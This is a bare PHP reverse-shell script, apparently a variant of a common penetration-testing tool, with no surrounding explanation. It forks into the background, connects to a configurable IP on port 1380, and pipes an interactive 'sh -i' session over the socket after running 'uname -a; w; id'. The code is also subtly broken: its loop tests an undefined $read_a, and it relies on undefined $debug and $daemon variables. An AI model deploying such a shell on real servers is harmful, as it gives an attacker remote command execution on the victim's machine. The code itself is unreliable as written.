<?php
set_time_limit (0);
error_reporting (E_ALL);

$error = null;
$write = null;
$size = 1400;
$shell = 'uname -a; w; id; sh -i';
$config = [
    'version' => "2",
    'ip'      => "",
    'port'    => "1380",
    'daemon'  => 0 ];
$descriptorspec = array(
    0 => array("pipe", "r"), 
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")   
 );

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) exit();
	if ($pid) exit(); 
	if (posix_setsid() == -1) exit(); 
	$config['daemon'] = 1;
} else {
	printit("Failed to daemonise. This is quite common and not fatal.");
}
umask(0);
chdir("/");
$sock = fsockopen($config['ip'], $config['port'],$error,$error, 30);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!$sock) exit();
if (!is_resource($process)) exit();
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
	if (feof($sock)) break;
	if (feof($pipes[1]))  break;
	$read = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read, $write, $error, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
